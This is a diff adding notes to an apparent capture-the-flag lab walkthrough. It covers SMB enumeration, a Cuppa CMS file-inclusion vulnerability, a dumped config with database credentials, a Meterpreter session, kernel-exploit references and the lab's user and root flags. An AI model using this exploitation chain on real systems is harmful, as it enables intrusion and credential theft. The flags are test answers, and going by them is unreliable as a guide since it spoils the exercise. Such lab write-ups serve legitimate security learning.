@@ -152,19 +152,65 @@ http://10.10.70.205:80/squirrelmail         (Status: 301) [Size: 319] [--> http:
 
 **What is the hidden directory?**
 
-- checking the /notes/ folder in miles SMB i found ``important.txt``
-- /45kra24zxs28v3yd
+- checking the /notes/ folder in miles samba i found ``important.txt``
+- leads us to ``/45kra24zxs28v3yd``
+- which enumetation leads us to ``/45kra24zxs28v3yd/administrator``
+- using searchsploit for cuppa we can find vulns 
+- ``cat /usr/share/exploitdb/exploits/php/webapps/25971.txt``
+- php code injection @ ``/alerts/alertConfigField.php?urlConfig=``
 
-**What is the vulnerability called when you can include a remote file for malicious purposes?**
+- dump for the cuppa config
+
+```php
+<?php 
+   class Configuration{
+      public $host = "localhost";
+      public $db = "cuppa";
+      public $user = "root";
+      public $password = "password123";
+      public $table_prefix = "cu_";
+      public $administrator_template = "default";
+      public $list_limit = 25;
+      public $token = "OBqIPqlFWf3X";
+      public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+      public $upload_default_path = "media/uploadsFiles";
+      public $maximum_file_size = "5242880";
+      public $secure_login = 0;
+      public $secure_login_value = "";
+      public $secure_login_redirect = "";
+   } 
+?>
+```
+
+sql
+
+**What is the vulnerability called when you can include a remote file?**
 
 - remote file inclusion
+- ``/etc/issue`` - Ubuntu 16.04.6 LTS 
+- ``https://www.exploit-db.com/exploits/45010 ``
 
 **What is the user flag?**
 
-
+- 7ce5c2109a40f958099283600a9ae807
 
 **What is the root flag?**
 
+1. run linpeas.sh for enumeration
+
+```shell
+meterpreter > sysinfo
+Computer     : 10.10.221.179
+OS           : Ubuntu 16.04 (Linux 4.8.0-58-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+```
+
+2. compile and run https://www.exploit-db.com/exploits/44654
+3. travel to /root/
+
+- 3f0372db24753accc7179a282cd6a949
 
 
 * * * 
